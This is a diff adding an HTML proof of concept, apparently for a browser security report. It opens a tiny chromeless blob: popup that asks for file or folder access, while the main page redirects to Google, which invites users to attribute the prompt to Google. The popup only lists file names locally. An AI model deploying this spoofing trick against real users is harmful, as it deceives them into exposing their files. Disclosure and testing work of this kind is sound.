@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PoC – Blob Popup with File Picker</title>
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 2rem; }
+    button { padding: .6rem 1rem; border-radius: .6rem; border: 1px solid #ccc; cursor: pointer; }
+    button:hover { background: #f4f4f4; }
+    small { color: #555; display:block; margin-top:.75rem }
+  </style>
+</head>
+<body>
+  <h1>Blob:// popup PoC</h1>
+  <p>Click the button to open a small <code>blob:</code> popup and redirect the main page to Google.</p>
+
+  <button id="openPopup">Open blob popup</button>
+  <small>Note: popups can be blocked unless opened directly from a user gesture (this button click counts).</small>
+
+  <script>
+    const openBtn = document.getElementById('openPopup');
+
+    openBtn.addEventListener('click', () => {
+      const popupHtml = `<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Picker (blob)</title>
+  <style>
+    :root{ --pad:.75rem }
+    html,body{height:100%}
+    body{font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin:0; padding:var(--pad); display:flex; flex-direction:column; gap:.5rem}
+    h3{margin:0 0 .5rem; font-size:1rem}
+    .row{display:flex; gap:.5rem}
+    button{padding:.4rem .7rem; border-radius:.6rem; border:1px solid #ccc; cursor:pointer; font-size:.9rem}
+    button:hover{background:#f4f4f4}
+    pre{background:#fafafa; border:1px dashed #ddd; padding:.5rem; white-space:pre-wrap; border-radius:.6rem; flex:1; overflow:auto; font-size:.8rem}
+    .warn{color:#b26b00; font-size:.75rem}
+  </style>
+</head>
+<body>
+  <script>
+    try { window.resizeTo(340, 260); } catch(_) {}
+  <\/script>
+  <h3>Pick from device</h3>
+  <div class="row">
+    <button id="pickFile">Pick file…</button>
+    <button id="pickDir">Pick folder…</button>
+  </div>
+  <pre id="out">Ready.</pre>
+  <p class="warn"><small>On some browsers (e.g. Brave), the File System Access API may be disabled. This demo falls back to a folder input if needed.</small></p>
+
+  <script>
+    const out = document.getElementById('out');
+    function log(msg){ out.textContent = String(msg); }
+    function notSupported(feature){ log(feature + ' not supported in this browser. Using fallback if available.'); }
+
+    async function pickFile(){
+      if (!('showOpenFilePicker' in window)) return notSupported('showOpenFilePicker');
+      try {
+        const [handle] = await window.showOpenFilePicker({ multiple: false });
+        const file = await handle.getFile();
+        log('File: ' + file.name + ' (' + file.size + ' bytes)');
+      } catch (e) {
+        log('Cancelled or error: ' + (e && (e.name || e.message)));
+      }
+    }
+
+    async function pickDir(){
+      if (!('showDirectoryPicker' in window)) {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.webkitdirectory = true;
+        input.onchange = () => {
+          const files = Array.from(input.files || []);
+          const first = files[0];
+          log('Fallback picked ' + files.length + ' files' + (first ? ('\\nExample: ' + first.webkitRelativePath) : ''));
+        };
+        input.click();
+        return;
+      }
+      try {
+        const dir = await window.showDirectoryPicker();
+        let names = [];
+        try {
+          for await (const [name, entry] of dir.entries()) {
+            names.push(name + (entry.kind === 'directory' ? '/' : ''));
+            if (names.length > 30) { names.push('…'); break; }
+          }
+        } catch (_) {}
+        log('Opened folder: ' + (dir.name || '(unnamed)') + '\\nEntries:\\n' + (names.join('\\n') || '(empty)'));
+      } catch (e) {
+        log('Cancelled or error: ' + (e && (e.name || e.message)));
+      }
+    }
+
+    document.getElementById('pickFile').addEventListener('click', pickFile);
+    document.getElementById('pickDir').addEventListener('click', pickDir);
+  <\/script>
+</body>
+</html>`;
+
+      const blob = new Blob([popupHtml], { type: 'text/html' });
+      const url = URL.createObjectURL(blob);
+
+      const features = 'width=140,height=80,menubar=no,toolbar=no,status=no,location=no,resizable=yes,scrollbars=no,noopener,noreferrer';
+      window.open(url, 'PickerPopup', features);
+
+      // Redirect the main page to Google
+      window.location.href = 'https://www.google.com';
+
+      setTimeout(() => URL.revokeObjectURL(url), 10000);
+    });
+  </script>
+</body>
+</html>
